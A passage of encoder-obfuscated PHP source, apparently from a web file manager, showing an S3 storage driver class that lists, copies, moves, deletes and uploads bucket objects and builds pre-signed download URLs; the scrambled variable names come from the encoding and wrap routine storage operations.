$áŸ’º¥ˆ[8]) . $áŸ’º¥ˆ[8] . $—©˜¶òÙ; if ($Ññ‰Á == REPEAT_REPLACE || !$this->exist($ç‹ºóì) || $˜€š„›ç && $Ññ‰Á != REPEAT_RENAME_FOLDER) { return $—©˜¶òÙ; } if ($Ññ‰Á == REPEAT_SKIP) { return !1; } $º¸°ºåÛ = $áŸ’º¥ˆ[10] . get_path_ext($—©˜¶òÙ); $º¸°ºåÛ = $º¸°ºåÛ == $áŸ’º¥ˆ[10] || $˜€š„›ç ? $áŸ’º¥ˆ[12] : $º¸°ºåÛ; $¾ÑîŠí¹ = 1; $ÛæÕ = substr($—©˜¶òÙ, 0, strlen($—©˜¶òÙ) - strlen($º¸°ºåÛ)); $ÅğÀÎ = $ÛæÕ . "\50{$¾ÑîŠí¹}\x29{$º¸°ºåÛ}"; while ($this->exist(rtrim($Š§÷Ìú¾, $áŸ’º¥ˆ[8]) . $áŸ’º¥ˆ[8] . $ÅğÀÎ)) { $ÅğÀÎ = $ÛæÕ . "\x28{$¾ÑîŠí¹}\x29{$º¸°ºåÛ}"; $¾ÑîŠí¹++; } return $ÅğÀÎ; } private function fileNameAutoList($¶ÄÖ¸Äô, $¸ÏË¥ÛŒ, $ù¡ÈóÂø = false) { $Ò¯¶¦È¥ =& $_SERVER[Î·Ü›öğ]; $œİõ¥ËÖ = $this->listPath($¶ÄÖ¸Äô, !0); $œİõ¥ËÖ = array_merge($œİõ¥ËÖ[$Ò¯¶¦È¥[85]], $œİõ¥ËÖ[$Ò¯¶¦È¥[86]]); $à„‚İ¤ï = array_to_keyvalue($œİõ¥ËÖ, $Ò¯¶¦È¥[12], $Ò¯¶¦È¥[32]); $Ã»õúæ¢ = $Ò¯¶¦È¥[10] . get_path_ext($¸ÏË¥ÛŒ); $Ã»õúæ¢ = $Ã»õúæ¢ == $Ò¯¶¦È¥[10] || $ù¡ÈóÂø ? $Ò¯¶¦È¥[12] : $Ã»õúæ¢; $ÄşÃç‰Ñ = substr($¸ÏË¥ÛŒ, 0, strlen($¸ÏË¥ÛŒ) - strlen($Ã»õúæ¢)); $¡çÅÔßÑ = $ÄşÃç‰Ñ . "\50\60\x29{$Ã»õúæ¢}"; for ($³·²Óæ = 1; $³·²Óæ <= count($à„‚İ¤ï) + 1; $³·²Óæ++) { $¡çÅÔßÑ = $ÄşÃç‰Ñ . "\x28{$³·²Óæ}\x29{$Ã»õúæ¢}"; if (!in_array_not_case($¡çÅÔßÑ, $à„‚İ¤ï)) { return $¡çÅÔßÑ; } } return $¡çÅÔßÑ; } public function listAllFiles($çË¤¼ğÄ, $ÚàÂ¶µ) { $ñÒÒÛ¼ =& $_SERVER[Î·Ü›öğ]; if (empty($ÚàÂ¶µ)) { return array(); } $Üì¥Ñà¡ = array_keys($ÚàÂ¶µ); $Ìî™¶ìÒ = array(); $çË¤¼ğÄ = trim($çË¤¼ğÄ, $ñÒÒÛ¼[8]); foreach ($ÚàÂ¶µ as $–Ò³£òÈ => $ñ—Ñğ¯Î) { $ªø£áãˆ = ltrim(substr(trim($–Ò³£òÈ, $ñÒÒÛ¼[8]), strlen($çË¤¼ğÄ)), $ñÒÒÛ¼[8]); if (substr($–Ò³£òÈ, -1) == $ñÒÒÛ¼[8]) { $ªø£áãˆ = rtrim($ªø£áãˆ, $ñÒÒÛ¼[8]) . $ñÒÒÛ¼[8]; } $Ìî™¶ìÒ = array_merge($Ìî™¶ìÒ, $this->slicePath($ªø£áãˆ)); } $Îğ¢úéş = array(); foreach (array_unique($Ìî™¶ìÒ) as $Ğå²»Ú) { $Í˜æ…ï¿ = array($ñÒÒÛ¼[87] => $this->getPathOuter($ñÒÒÛ¼[8] . $çË¤¼ğÄ . $ñÒÒÛ¼[8] . $Ğå²»Ú), $ñÒÒÛ¼[78] => 1, $ñÒÒÛ¼[79] => 0); if (substr($Ğå²»Ú, -1) != $ñÒÒÛ¼[8]) { $Í˜æ…ï¿[$ñÒÒÛ¼[78]] = 0; $µÜ“ÏÂù = $this->getPath($çË¤¼ğÄ . $ñÒÒÛ¼[8] . $Ğå²»Ú); if (isset($ÚàÂ¶µ[$µÜ“ÏÂù])) { $Êô²êâ¥ = $ÚàÂ¶µ[$µÜ“ÏÂù]; if (isset($Êô²êâ¥[$ñÒÒÛ¼[79]])) { $Í˜æ…ï¿[$ñÒÒÛ¼[79]] = intval($Êô²êâ¥[$ñÒÒÛ¼[79]]); } if (isset($Êô²êâ¥[$ñÒÒÛ¼[207]])) { $Í˜æ…ï¿[$ñÒÒÛ¼[88]] = intval($Êô²êâ¥[$ñÒÒÛ¼[207]]); } } } $Îğ¢úéş[] = $Í˜æ…ï¿; } return $Îğ¢úéş; } public function slicePath($â‘øüÆÍ) { $¡¶íáËµ =& $_SERVER[Î·Ü›öğ]; $ò˜Ö—Ş = explode($¡¶íáËµ[8], trim($â‘øüÆÍ, $¡¶íáËµ[8])); $Ïµ¿šş§ = 0; do { ++$Ïµ¿šş§; $öà¢€ˆ›[] = implode($¡¶íáËµ[8], array_slice($ò˜Ö—Ş, 0, $Ïµ¿šş§)) . $¡¶íáËµ[8]; } while ($Ïµ¿šş§ < count($ò˜Ö—Ş)); $öà¢€ˆ›[count($ò˜Ö—Ş) - 1] = $â‘øüÆÍ; return $öà¢€ˆ›; } public function getHost() { $ÆØ˜ïå =& $_SERVER[Î·Ü›öğ]; $ØùÏ´§ì = parse_url(trim($this->domain, $ÆØ˜ïå[8])); $¶ë‘Ûş = isset($ØùÏ´§ì[$ÆØ˜ïå[208]]) ? $ØùÏ´§ì[$ÆØ˜ïå[208]] : http_type(); $ˆÕ¡öª = isset($ØùÏ´§ì[$ÆØ˜ïå[209]]) ? $ØùÏ´§ì[$ÆØ˜ïå[209]] : $ØùÏ´§ì[$ÆØ˜ïå[87]]; if (isset($ØùÏ´§ì[$ÆØ˜ïå[210]])) { $ˆÕ¡öª .= $ÆØ˜ïå[4] . $ØùÏ´§ì[$ÆØ˜ïå[210]]; } return $¶ë‘Ûş . $ÆØ˜ïå[211] . $ˆÕ¡öª; } public function pathEncode($×˜‡«ì›) { $èËØñŒû =& $_SERVER[Î·Ü›öğ]; return str_replace($èËØñŒû[212], $èËØñŒû[8], rawurlencode($×˜‡«ì›)); } public function writeLog($í”šÑÍŠ = '', $ã”·¢Õ = false) { $áÓÃÀïˆ =& $_SERVER[Î·Ü›öğ]; $‡’èËŸŒ = in_array(ACTION, array($áÓÃÀïˆ[213], $áÓÃÀïˆ[214])); if (!$‡’èËŸŒ && !GLOBAL_DEBUG) { return; } $öàå§˜‡ = $í”šÑÍŠ; static $èò–Î¿ = null; if (!$èò–Î¿) { $èò–Î¿ = strtoupper($this->getType()); } $í”šÑÍŠ = $èò–Î¿ . $áÓÃÀïˆ[215] . $í”šÑÍŠ; if ($ã”·¢Õ) { $­÷—µ‚Ç = error_get_last(); if ($­÷—µ‚Ç) { $í”šÑÍŠ = array($í”šÑÍŠ, $­÷—µ‚Ç); } } write_log($í”šÑÍŠ, $áÓÃÀïˆ[216]); if ($‡’èËŸŒ) { throw new Exception($öàå§˜‡); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($ú‘ëÂÅ´) { set_timeout(); require_once SDK_DIR . $_SERVER[Î·Ü›öğ][217]; parent::__construct(); $this->_init($ú‘ëÂÅ´); } public function _init($êÚğ¢Úà) { $œ¿¢ÔÏŸ =& $_SERVER[Î·Ü›öğ]; $this->config = $êÚğ¢Úà; foreach ($êÚğ¢Úà as $àÄú×Û¨ => $†¼œŸî‰) { if (isset($this->{$àÄú×Û¨})) { $this->{$àÄú×Û¨} = $†¼œŸî‰; } } $this->endpoint = $êÚğ¢Úà[$œ¿¢ÔÏŸ[218]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $ş¸ÃœÄ = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($ş¸ÃœÄ, 0, 7) == $œ¿¢ÔÏŸ[219]) { $ş¸ÃœÄ = $œ¿¢ÔÏŸ[220] . substr($ş¸ÃœÄ, 7); } $this->client->setEndpoint($ş¸ÃœÄ); if (in_array(ACTION, array($œ¿¢ÔÏŸ[213], $œ¿¢ÔÏŸ[214]))) { $this->client->setExceptions(); } } public function setSignVersion($ö£ÇŠî = "\166\64") { $this->signVer = $ö£ÇŠî; $this->client->setSignVersion($ö£ÇŠî); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $Š¼ã±¯¾) { return null; } } public function isBucketCors() { $óã¯«ãµ =& $_SERVER[Î·Ü›öğ]; $¶¥şãŸú = $this->getBucketCors(); if (!$¶¥şãŸú || !is_array($¶¥şãŸú)) { return !1; } if (!is_array($¶¥şãŸú[$óã¯«ãµ[221]])) { $¶¥şãŸú[$óã¯«ãµ[221]] = explode($óã¯«ãµ[50], $¶¥şãŸú[$óã¯«ãµ[221]]); } if ($¶¥şãŸú[$óã¯«ãµ[222]] != $óã¯«ãµ[223] || !in_array($óã¯«ãµ[223], $¶¥şãŸú[$óã¯«ãµ[221]])) { return !1; } $³œÖÅáá = array_map($óã¯«ãµ[224], $¶¥şãŸú[$óã¯«ãµ[225]]); if (!is_array($³œÖÅáá)) { $³œÖÅáá = array(); } $ÊŠÄöÄä = array($óã¯«ãµ[226], $óã¯«ãµ[227], $óã¯«ãµ[228], $óã¯«ãµ[229], $óã¯«ãµ[230]); $É§¢¥ó = array_diff($ÊŠÄöÄä, $³œÖÅáá); return empty($É§¢¥ó); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($½ßòÊÚÌ, $é¬­Ì¨ = '', $”‚ ëæĞ = REPEAT_RENAME) { $«ğŠ†÷ñ = $this->setContent($½ßòÊÚÌ, $é¬­Ì¨); if ($«ğŠ†÷ñ !== !1) { return $this->getPathOuter($½ßòÊÚÌ); } return !1; } public function mkdir($šÊåÜŸÛ, $ö‡¾„ïû = REPEAT_SKIP) { $êÇäüˆ‰ =& $_SERVER[Î·Ü›öğ]; if (empty($šÊåÜŸÛ) && $šÊåÜŸÛ !== $êÇäüˆ‰[231]) { return !1; } if ($ö‡¾„ïû && $this->_isFolder($šÊåÜŸÛ)) { return $this->getPathOuter($šÊåÜŸÛ); } $ÃŸ¶š‘‹ = $this->setContent($šÊåÜŸÛ, $êÇäüˆ‰[12], !0); if ($ÃŸ¶š‘‹ !== !1) { return $this->getPathOuter($šÊåÜŸÛ); } return !1; } public function copyFile($¦ÄĞŞú×, $ õŒ·Õ®, $±Æô¡‰« = array()) { $ÏÛàÈû =& $_SERVER[Î·Ü›öğ]; $åèÓÛ = $this->objectMeta($¦ÄĞŞú×); if (!$åèÓÛ) { return !1; } if ($åèÓÛ[$ÏÛàÈû[79]] <= 1024 * 1024 * 200) { $›ç©¹åâ = $this->client->copyObject($this->bucket, $¦ÄĞŞú×, $this->bucket, $ õŒ·Õ®, $ÏÛàÈû[232], $±Æô¡‰«); } else { $›ç©¹åâ = $this->client->multiCopyObject($this->bucket, $¦ÄĞŞú×, $this->bucket, $ õŒ·Õ®, $±Æô¡‰«); } $›ç©¹åâ = $›ç©¹åâ ? $this->getPathOuter($ õŒ·Õ®) : !1; return $›ç©¹åâ; } public function moveFile($÷„äÒ´Ô, $€¤¿¬¥Ú) { if ($this->copyFile($÷„äÒ´Ô, $€¤¿¬¥Ú)) { $this->delFile($÷„äÒ´Ô); return $this->getPathOuter($€¤¿¬¥Ú); } return !1; } public function delFile($¢Ñœõ) { return $this->client->deleteObject($this->bucket, $¢Ñœõ); } public function delFolder($­©îæ‚) { $§ò¼ö×¨ =& $_SERVER[Î·Ü›öğ]; if (!$this->exist($­©îæ‚)) { return !0; } $this->listItemCache = !1; $³˜Ã§ = $this->fileList($­©îæ‚); $this->listItemCache = !0; $®´Ö¡¦ = trim($­©îæ‚, $§ò¼ö×¨[8]) . $§ò¼ö×¨[8]; if (!empty($­©îæ‚) && $­©îæ‚ !== $§ò¼ö×¨[231] && !in_array($®´Ö¡¦, $³˜Ã§[$§ò¼ö×¨[85]])) { $³˜Ã§[$§ò¼ö×¨[85]][] = $®´Ö¡¦; } $ Ì¢‡ş = $this->delByBatch($³˜Ã§[$§ò¼ö×¨[86]]); if (!$ Ì¢‡ş) { return !1; } $ Ì¢‡ş = $this->delByBatch($³˜Ã§[$§ò¼ö×¨[85]]); if (!$ Ì¢‡ş) { return !1; } return $this->delFile($®´Ö¡¦); } private function delByBatch($“Ø—¸˜) { foreach (array_chunk($“Ø—¸˜, 1000) as $Æ•†©Î) { $™÷…íç = $this->client->deleteObjects($this->bucket, $Æ•†©Î); if (!$™÷…íç) { return !1; } } return !0; } public function rename($Á™Áö­Œ, $÷‡øŠã) { return $this->renameObject($Á™Áö­Œ, $÷‡øŠã); } public function listPath($ˆª×Õ˜Ú, $¢ñ®¸°ƒ = false) { $Ğ®Šã¿ñ =& $_SERVER[Î·Ü›öğ]; $Â¬„úíÙ = $this->fileList($ˆª×Õ˜Ú, $Ğ®Šã¿ñ[8], !0); foreach ($Â¬„úíÙ[$Ğ®Šã¿ñ[85]] as $ôÊÆ°İ« => $§¨æğÆœ) { $Â¬„úíÙ[$Ğ®Šã¿ñ[85]][$ôÊÆ°İ«] = $this->folderInfo($§¨æğÆœ, $¢ñ®¸°ƒ, $§¨æğÆœ); } foreach ($Â¬„úíÙ[$Ğ®Šã¿ñ[86]] as $ôÊÆ°İ« => $§¨æğÆœ) { $Â¬„úíÙ[$Ğ®Šã¿ñ[86]][$ôÊÆ°İ«] = $this->fileInfo($§¨æğÆœ[$Ğ®Šã¿ñ[32]], $¢ñ®¸°ƒ, $§¨æğÆœ); } return $Â¬„úíÙ; } protected function infoChildren($Ñüå¥å½, &$ˆÏšŠ”õ) { $®Ûšï§Á =& $_SERVER[Î·Ü›öğ]; $•Áƒ²°ø = $this->fileList($Ñüå¥å½, $®Ûšï§Á[12], !0); $ˆÏšŠ”õ[$®Ûšï§Á[81]] += count($•Áƒ²°ø[$®Ûšï§Á[85]]); $ˆÏšŠ”õ[$®Ûšï§Á[80]] += count($•Áƒ²°ø[$®Ûšï§Á[86]]); foreach ($•Áƒ²°ø[$®Ûšï§Á[86]] as $‚µ„·–¿) { if (!$‚µ„·–¿ || !$‚µ„·–¿[$®Ûšï§Á[79]]) { continue; } $ˆÏšŠ”õ[$®Ûšï§Á[79]] += $‚µ„·–¿[$®Ûšï§Á[79]]; } } private function fileInfo($†õ·¯ñÓ, $ÁĞ’şÛ¢ = false, $Á‚ßğé½ = array()) { $®™ÅÜ‹ =& $_SERVER[Î·Ü›öğ]; $ŠŞÚïØë = array($®™ÅÜ‹[32] => $this->pathThis($†õ·¯ñÓ), $®™ÅÜ‹[87] => $this->getPathOuter($†õ·¯ñÓ), $®™ÅÜ‹[33] => $®™ÅÜ‹[233], $®™ÅÜ‹[169] => $this->ext($†õ·¯ñÓ), $®™ÅÜ‹[79] => isset($Á‚ßğé½[$®™ÅÜ‹[79]]) ? $Á‚ßğé½[$®™ÅÜ‹[79]] : 0); if ($ÁĞ’şÛ¢) { return $ŠŞÚïØë; } $ŠŞÚïØë[$®™ÅÜ‹[234]] = $ŠŞÚïØë[$®™ÅÜ‹[88]] = 0; $ŠŞÚïØë[$®™ÅÜ‹[235]] = $ŠŞÚïØë[$®™ÅÜ‹[236]] = !0; if (empty($Á‚ßğé½)) { $Á‚ßğé½ = $this->objectMeta($†õ·¯ñÓ); if (!$Á‚ßğé½) { return $ŠŞÚïØë; } } if (isset($Á‚ßğé½[$®™ÅÜ‹[237]]) && $Á‚ßğé½[$®™ÅÜ‹[237]]) { $ŠŞÚïØë[$®™ÅÜ‹[238]] = $Á‚ßğé½[$®™ÅÜ‹[237]]; } if (isset($Á‚ßğé½[$®™ÅÜ‹[207]])) { $ŠŞÚïØë[$®™ÅÜ‹[88]] = $Á‚ßğé½[$®™ÅÜ‹[207]]; } if (isset($Á‚ßğé½[$®™ÅÜ‹[79]])) { $ŠŞÚïØë[$®™ÅÜ‹[79]] = $Á‚ßğé½[$®™ÅÜ‹[79]]; } return $ŠŞÚïØë; } private function folderInfo($ ÁÅù‘Ì, $ÊãÎ‚Ÿ = false, $ĞµĞ© = array()) { $àÜûÇğŠ =& $_SERVER[Î·Ü›öğ]; $…ÖÑıæÑ = array($àÜûÇğŠ[32] => $this->pathThis($ ÁÅù‘Ì), $àÜûÇğŠ[87] => $this->getPathOuter($àÜûÇğŠ[8] . $ ÁÅù‘Ì), $àÜûÇğŠ[33] => $àÜûÇğŠ[78]); if ($ÊãÎ‚Ÿ) { return $…ÖÑıæÑ; } $…ÖÑıæÑ[$àÜûÇğŠ[234]] = $…ÖÑıæÑ[$àÜûÇğŠ[88]] = 0; $…ÖÑıæÑ[$àÜûÇğŠ[235]] = $…ÖÑıæÑ[$àÜûÇğŠ[236]] = !0; if ($ ÁÅù‘Ì == $àÜûÇğŠ[12]) { return $…ÖÑıæÑ; } if (empty($ĞµĞ©)) { $ĞµĞ© = $this->objectMeta(trim($ ÁÅù‘Ì, $àÜûÇğŠ[8]) . $àÜûÇğŠ[8]); } if (isset($ĞµĞ©[$àÜûÇğŠ[207]])) { $…ÖÑıæÑ[$àÜûÇğŠ[234]] = $ĞµĞ©[$àÜûÇğŠ[207]]; } return $…ÖÑıæÑ; } private function fileList($ìãšş†‡, $¥Îğ¤§ = '', $ïˆ¢ïËş = 0) { $°çôı‚á =& $_SERVER[Î·Ü›öğ]; $ä±Êô€ä = rtrim($ìãšş†‡, $°çôı‚á[8]) . $°çôı‚á[8]; $ˆÕïî = $this->listObjs($ä±Êô€ä, null, null, $¥Îğ¤§); if (!$ˆÕïî) { return array($°çôı‚á[85] => array(), $°çôı‚á[86] => array()); } $ß‚æ³–” = $°–Ööîå = array(); foreach ($ˆÕïî[$°çôı‚á[239]] as $¶¡¼ıÚÅ) { $Îççš–Š = $¶¡¼ıÚÅ[$°çôı‚á[32]]; if ($Îççš–Š == $ä±Êô€ä) { continue; } $†üä÷Û´ = isset($¶¡¼ıÚÅ[$°çôı‚á[79]]) ? $¶¡¼ıÚÅ[$°çôı‚á[79]] : 0; $ÛÚÙèâå = $†üä÷Û´ == 0 && substr($Îççš–Š, strlen($Îççš–Š) - 1, 1) == $°çôı‚á[8] ? !0 : !1; $this->cacheMethodInfoSet($Îççš–Š, $ÛÚÙèâå, $¶¡¼ıÚÅ); if ($ÛÚÙèâå) { $ß‚æ³–”[] = $Îççš–Š; continue; } $°–Ööîå[] = $ïˆ¢ïËş ? $¶¡¼ıÚÅ : $Îççš–Š; } foreach ($ˆÕïî[$°çôı‚á[240]] as $¶¡¼ıÚÅ) { $ß‚æ³–”[] = $¶¡¼ıÚÅ[$°çôı‚á[32]]; $this->cacheMethodInfoSet($¶¡¼ıÚÅ[$°çôı‚á[32]], !0); } $this->cacheMethodInfoSet($ìãšş†‡, !0); return array($°çôı‚á[85] => $ß‚æ³–”, $°çôı‚á[86] => $°–Ööîå); } private function listObjs($Œ´“ãÓ, $ë†ÚÌæƒ = null, $™¬ÊÅº¼ = null, $–ÖÑ÷÷û = null) { $İ‡Á™¾í =& $_SERVER[Î·Ü›öğ]; $Œ´“ãÓ = trim($Œ´“ãÓ, $İ‡Á™¾í[8]); $¢ŒªÕ¹¡ = empty($Œ´“ãÓ) && $Œ´“ãÓ !== $İ‡Á™¾í[231] ? $İ‡Á™¾í[12] : $Œ´“ãÓ . $İ‡Á™¾í[8]; return $this->client->getBucket($this->bucket, $¢ŒªÕ¹¡, $ë†ÚÌæƒ, $™¬ÊÅº¼, $–ÖÑ÷÷û, !0); } public function has($‹¦¼ó³Ú, $‰ Åñİõ = false, $Üöé‡Éñ = true) { $ŠË§¢Ü‹ =& $_SERVER[Î·Ü›öğ]; $‹¦¼ó³Ú = trim($‹¦¼ó³Ú, $ŠË§¢Ü‹[8]); $Œ•ıÁ›ğ = empty($‹¦¼ó³Ú) && $‹¦¼ó³Ú !== $ŠË§¢Ü‹[231] ? $ŠË§¢Ü‹[12] : $‹¦¼ó³Ú . $ŠË§¢Ü‹[8]; $×™İÊã = null; $ŠÑ›¬ØØ = 500; $šÖ³Âö‡ = $ŠË§¢Ü‹[8]; $µ­ÍğŒË = $Âæ·²° = array(); while (!0) { $Ş•çß¡· = $this->listObjs($‹¦¼ó³Ú, $×™İÊã, $ŠÑ›¬ØØ, $šÖ³Âö‡); if (!$Ş•çß¡·) { break; } $×™İÊã = $Ş•çß¡·[$ŠË§¢Ü‹[241]]; $¦•È­Ñ = $Ş•çß¡·[$ŠË§¢Ü‹[239]]; $ñÈ‹‰…‡ = $Ş•çß¡·[$ŠË§¢Ü‹[240]]; if (empty($¦•È­Ñ) && empty($ñÈ‹‰…‡)) { break; } if (count($¦•È­Ñ) == 1 && $¦•È­Ñ[0][$ŠË§¢Ü‹[32]] == $Œ•ıÁ›ğ) { break; } if ($‰ Åñİõ) { if (count($¦•È­Ñ)) { $¦•È­Ñ = array_column($¦•È­Ñ, $ŠË§¢Ü‹[32]); $µ­ÍğŒË = array_merge($µ­ÍğŒË, $¦•È­Ñ); } if (count($ñÈ‹‰…‡)) { $ñÈ‹‰…‡ = array_column($ñÈ‹‰…‡, $ŠË§¢Ü‹[32]); $Âæ·²° = array_merge($Âæ·²°, $ñÈ‹‰…‡); } if ($×™İÊã === null) { break; } continue; } if ($Üöé‡Éñ) { if (!empty($¦•È­Ñ)) { if (count($¦•È­Ñ) > 1 || isset($¦•È­Ñ[0][$ŠË§¢Ü‹[32]]) && $¦•È­Ñ[0][$ŠË§¢Ü‹[32]] != $Œ•ıÁ›ğ) { return !0; } } } else { if (!empty($ñÈ‹‰…‡)) { return !0; } } if ($×™İÊã === null) { break; } } if ($‰ Åñİõ) { $µ­ÍğŒË = array_diff($µ­ÍğŒË, array($Œ•ıÁ›ğ)); $µ­ÍğŒË = count(array_unique($µ­ÍğŒË)); $Âæ·²° = count(array_unique($Âæ·²°)); return array($ŠË§¢Ü‹[242] => $µ­ÍğŒË, $ŠË§¢Ü‹[243] => $Âæ·²°); } return !1; } public function listAll($ØÉ©šÊ¤) { $“êí›×Ë =& $_SERVER[Î·Ü›öğ]; $Íœ“Ÿí = $this->fileList($ØÉ©šÊ¤, $“êí›×Ë[12], !0); $Î°™™‡Ì = array_to_keyvalue($Íœ“Ÿí[$“êí›×Ë[86]], $“êí›×Ë[32]); foreach ($Íœ“Ÿí[$“êí›×Ë[85]] as $È¤ÆÅ³) { if (is_string($È¤ÆÅ³)) { $Î°™™‡Ì[$È¤ÆÅ³] = array($“êí›×Ë[79] => 0); } } return $this->listAllFiles($ØÉ©šÊ¤, $Î°™™‡Ì); } public function canRead($ãàÀ±’õ) { $×è‚–„´ =& $_SERVER[Î·Ü›öğ]; $´£¡Ş’‰ = $this->client->getAccessControlPolicy($this->bucket, $ãàÀ±’õ); if (!$´£¡Ş’‰) { return !1; } return in_array($´£¡Ş’‰, array($×è‚–„´[244], $×è‚–„´[245], $×è‚–„´[246])) ? !0 : !1; } public function canWrite($â¹Ê©È¶) { $şÎ·å¸Î =& $_SERVER[Î·Ü›öğ]; $­²ÇÑª = $this->client->getAccessControlPolicy($this->bucket, $â¹Ê©È¶); if (!$­²ÇÑª) { return !1; } return in_array($­²ÇÑª, array($şÎ·å¸Î[244], $şÎ·å¸Î[245])) ? !0 : !1; } public function getContent($ ß’¦Û€) { return $this->client->getObject($this->bucket, $ ß’¦Û€); } public function setContent($Ì‹Ó¹, $Ş©Ö İ¶ = '', $³½š·’÷ = false) { $Ñ„©á“÷ =& $_SERVER[Î·Ü›öğ]; $Ì‹Ó¹ = $³½š·’÷ ? trim($Ì‹Ó¹, $Ñ„©á“÷[8]) . $Ñ„©á“÷[8] : $Ì‹Ó¹; $ˆˆé¶®§ = get_file_mime(get_path_ext($Ì‹Ó¹)); $ÚÚÇûë¿ = $this->client->putObject($Ş©Ö İ¶, $this->bucket, $Ì‹Ó¹, $Ñ„©á“÷[232], array(), $ˆˆé¶®§); if (!$ÚÚÇûë¿) { return !1; } if ($³½š·’÷) { return !0; } return $ÚÚÇûë¿ ? !0 : !1; } public function fileSubstr($Ó«›û‡—, $Âşôğõ, $»å½€š¯) { $›ğ¸­îæ = $Âşôğõ + $»å½€š¯ - 1; return $this->client->getObject($this->bucket, $Ó«›û‡—, array($_SERVER[Î·Ü›öğ][247] => "\142\171\x74\x65\x73\75{$Âşôğõ}\55{$›ğ¸­îæ}")); } public function upload($ùÃÙ­Ìú, $ÏíğïÃæ, $õĞ¾œÜì = false, $ïÊüğ¸ = REPEAT_REPLACE) { $ãàïĞÀ =& $_SERVER[Î·Ü›öğ]; $¢«ûŠ®Û = array($ãàïĞÀ[248] => @md5_file($ÏíğïÃæ)); $öşë·» = array($ãàïĞÀ[249] => get_file_mime(get_path_ext($ùÃÙ­Ìú))); if (IO::size($ÏíğïÃæ) <= 1024 * 1024 * 200) { $ş¨€€ü = $this->client->putObjectFile($ÏíğïÃæ, $this->bucket, $ùÃÙ­Ìú, $ãàïĞÀ[232], $¢«ûŠ®Û, $öşë·»); return !empty($ş¨€€ü) ? $this->getPathOuter($ùÃÙ­Ìú) : !1; } $‡É¢¼æß = $this->client->multiUploadObject($ÏíğïÃæ, $this->bucket, trim($ùÃÙ­Ìú, $ãàïĞÀ[8]), $¢«ûŠ®Û, $öşë·»); return $‡É¢¼æß ? $this->getPathOuter($ùÃÙ­Ìú) : !1; } public function download($à‚¹‡¥, $ÎŸ©ÅÎÑ) { if (!@is_dir($this->pathFather($ÎŸ©ÅÎÑ)) && !IO::mkdir($this->pathFather($ÎŸ©ÅÎÑ))) { return !1; } $É±áÂ°  = $this->client->getObject($this->bucket, $à‚¹‡¥, array(), $ÎŸ©ÅÎÑ); return $É±áÂ°  !== !1 ? $ÎŸ©ÅÎÑ : !1; } public function link($§ŸÒ…ú÷, $ˆã“®Ñû = array()) { return $this->getPreSignedURL($§ŸÒ…ú÷, 3600 * 12, $ˆã“®Ñû); } private function getPreSignedURL($°ñ¡û Ú, $¨Ê™¡ÖË, $³’ø—Â¶ = array(), $›§”¤ĞĞ = "\107\105\124") { $‘ğ¡ßÓ© =& $_SERVER[Î·Ü›öğ]; $°ñ¡û Ú = trim($°ñ¡û Ú, $‘ğ¡ßÓ©[8]); if ($this->signVer == $‘ğ¡ßÓ©[250]) { return $this->client->getPreSignedV2URL($this->bucket, $°ñ¡û Ú, $¨Ê™¡ÖË, $›§”¤ĞĞ, $³’ø—Â¶); } return $this->client->getPreSignedV4URL($this->bucket, $°ñ¡û Ú, $¨Ê™¡ÖË, array(), $›§”¤ĞĞ, $³’ø—Â¶); } public function fileOut($Œïúàë, $“¯ÙŸî› = false, $ÓıìÖ· = false, $íŒúÄ…© = '') { $ğ¿¬ıíä =& $_SERVER[Î·Ü›öğ]; if ($this->isFileOutServer()) { return $this->fileOutServer($Œïúàë, $“¯ÙŸî›, $ÓıìÖ·, $íŒúÄ…©); } if (!$ÓıìÖ·) { $ÓıìÖ· = $this->pathThis($Œïúàë); } $’…ë’ÍÜ = get_file_mime(get_path_ext($ÓıìÖ·)); if ($’…ë’ÍÜ == $ğ¿¬ıíä[251]) { return parent::fileOut($Œïúàë, $“¯ÙŸî›, $ÓıìÖ·, $íŒúÄ…©); } $ñ…ûŸ¾Å = array($ğ¿¬ıíä[252] => $’…ë’ÍÜ); if ($“¯ÙŸî›) { $ñ…ûŸ¾Å[$ğ¿¬ıíä[253]] = $ğ¿¬ıíä[254] . rawurlencode($ÓıìÖ·); } else { } $ª©Óè„Î = $this->link($Œïúàë, $ñ…ûŸ¾Å); $this->fileOutLink($ª©Óè„Î); } public function fileOutServer($‹æÌáÅ•, $üóÌ = false, $ã€×Ş—“ = false, $Ş»ŒæÙğ = '') { parent::fileOut($‹æÌáÅ•, $üóÌ, $ã€×Ş—“, $Ş»ŒæÙğ); } public function fileOutImageServer($åÆæ¦Æø, $“àùüÄ = 250) { parent::fileOutImage($åÆæ¦Æø, $“àùüÄ); } public function fileOutLink($Çš´åÌ€) { $Ëí²ıŸÊ =& $_SERVER[Î·Ü›öğ]; if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($Ëí²ıŸÊ[67], $Ëí²ıŸÊ[66], $Ëí²ıŸÊ[68])) && !get_url_scheme($this->endpoint) && substr($Çš´åÌ€, 0, 7) == $Ëí²ıŸÊ[219]) { $Çš´åÌ€ = $Ëí²ıŸÊ[220] . substr($Çš´åÌ€, 7); } header($Ëí²ıŸÊ[175] . $Çš´åÌ€); die; } public function hashMd5($á­ÍË§›, $£ÀÑ»ƒ = '') { $¢ªÄ¬¬³ = $this->objectMeta($á­ÍË§›); if (!$¢ªÄ¬¬³) { return !1; } $£ÀÑ»ƒ = $£ÀÑ»ƒ ? $£ÀÑ»ƒ : _get($¢ªÄ¬¬³, $_SERVER[Î·Ü›öğ][255]); return $£ÀÑ»ƒ; } public function uploadFormData($ÙçõÎÏá, $û©òá”¿ = 3600) { $ğ¯È²ùÓ =& $_SERVER[Î·Ü›öğ]; if (!$this->_isClientAsync()) { $®­š¯´­ = $this->getPreSignedURL($ÙçõÎÏá, $û©òá”¿, array(), $ğ¯È²ùÓ[256]); return array($ğ¯È²ùÓ[209] => str_replace($ğ¯È²ùÓ[219], $ğ¯È²ùÓ[257], $®­š¯´­)); } if 